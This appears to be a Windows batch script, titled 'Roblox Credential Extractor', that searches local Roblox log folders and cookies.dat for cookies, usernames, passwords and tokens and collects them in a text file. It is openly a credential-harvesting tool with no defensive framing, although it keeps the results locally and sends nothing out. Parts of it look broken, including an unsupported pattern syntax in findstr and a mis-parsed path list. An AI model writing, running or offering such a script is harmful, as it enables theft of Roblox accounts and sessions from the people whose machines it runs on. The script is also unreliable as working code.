@echo off
title Roblox Credential Extractor (Local Data)
color 0A

:: Check if running as Administrator for better access
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Not running as Administrator. Some data might be missed.
    echo [!] Right-click and 'Run as administrator' recommended.
    pause
)

:: Set output file name
set "output_file=roblox_username_and_passwords.txt"

:: Clear previous output
echo Extracting Roblox Local Data... > "%output_file%"
echo ========================================= >> "%output_file%"
echo Date: %date% at %time% >> "%output_file%"
echo ========================================= >> "%output_file%"

:: Define common Roblox data paths
set "roblox_paths=%LOCALAPPDATA%\Roblox\logs; %APPDATA%\LocalLow\Roblox; %USERPROFILE%\AppData\Local\Roblox\logs"

:: Search for cookies.dat or user_data files
echo [*] Searching for Roblox session data... >> "%output_file%"

for %%p in (%roblox_paths%) do (
    if exist "%%~p" (
        echo [+] Found directory: %%~p >> "%output_file%"
        
        :: Search for cookies.dat which often contains session info
        if exist "%%~p\cookies.dat" (
            echo [>] Extracting from cookies.dat... >> "%output_file%"
            findstr /i "cookie" "%%~p\cookies.dat" >> "%output_file%" 2>nul
            
            :: Search for username patterns in logs
            findstr /i "username" "%%~p\*.log" >> "%output_file%" 2>nul
        )
        
        :: Search for any .log files containing login info
        if exist "%%~p\*.log" (
            echo [>] Extracting from log files... >> "%output_file%"
            findstr /i "login\|password\|token\|user" "%%~p\*.log" >> "%output_file%" 2>nul
        )
    )
)

:: Additional check for %APPDATA%\Roblox\logs
if exist "%APPDATA%\Roblox\logs" (
    echo [*] Checking %APPDATA%\Roblox\logs... >> "%output_file%"
    findstr /i "username\|password\|token" "%APPDATA%\Roblox\logs\*.log" >> "%output_file%" 2>nul
)

:: Separate section for clarity in output file
echo. >> "%output_file%"
echo ========================================= >> "%output_file%"
echo SEPARATED DATA (Username / Password Tokens) >> "%output_file%"
echo ========================================= >> "%output_file%"

:: Try to extract specific username/password pairs from common log formats
for %%f in ("%LOCALAPPDATA%\Roblox\logs\*.log" "%APPDATA%\LocalLow\Roblox\*.log" "%USERPROFILE%\AppData\Local\Roblox\logs\*.log") do (
    if exist "%%~f" (
        echo [>] Analyzing %%~f ... >> "%output_file%"
        findstr /i "username" "%%~f" >> "%output_file%" 2>nul
        findstr /i "password" "%%~f" >> "%output_file%" 2>nul
    )
)

echo. >> "%output_file%"
echo [*] Extraction complete. Check %output_file% in current directory. >> "%output_file%"
echo [!] Note: Passwords may be hashed or stored as session tokens depending on Roblox version. >> "%output_file%"

:: Open the file after extraction
start "" "%output_file%"
pause